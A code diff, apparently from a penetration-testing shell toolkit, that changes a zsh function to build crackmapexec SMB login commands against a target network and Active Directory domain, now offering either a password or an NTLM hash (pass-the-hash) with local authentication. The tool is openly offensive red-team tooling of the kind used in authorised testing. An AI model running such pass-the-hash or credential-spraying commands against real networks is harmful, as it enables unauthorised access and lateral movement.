@@ -30,18 +30,32 @@ nb-ad-pth-install() {
 
 nb-ad-pth-pass() {
     __check-project
+    nb-vars-set-network
     echo
     __ask "Enter target AD domain (must also be set in your hosts file)"
     nb-vars-set-domain
     echo
     __ask "Enter a user account"
-	  __check-user
+    __check-user
     echo
-	  __ask "Enter a password for authentication"
-	  __check-pass
-    nb-vars-set-network
 
-    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p ${__PASS}"
+    __ask "Do you want to log in using a password or a hash? (p/h)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    if [[ $login == "p" ]]; then
+        echo
+        __ask "Enter a password for authentication"
+        __check-pass
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p ${__PASS} --local-auth"
+    elif [[ $login == "h" ]]; then
+        echo
+        __ask "Enter the NTLM hash for authentication"
+        __check-hash
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -H ${__HASH} --local-auth"
+    else
+        echo
+        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+    fi
 }
 
 nb-ad-pth-exploit() {
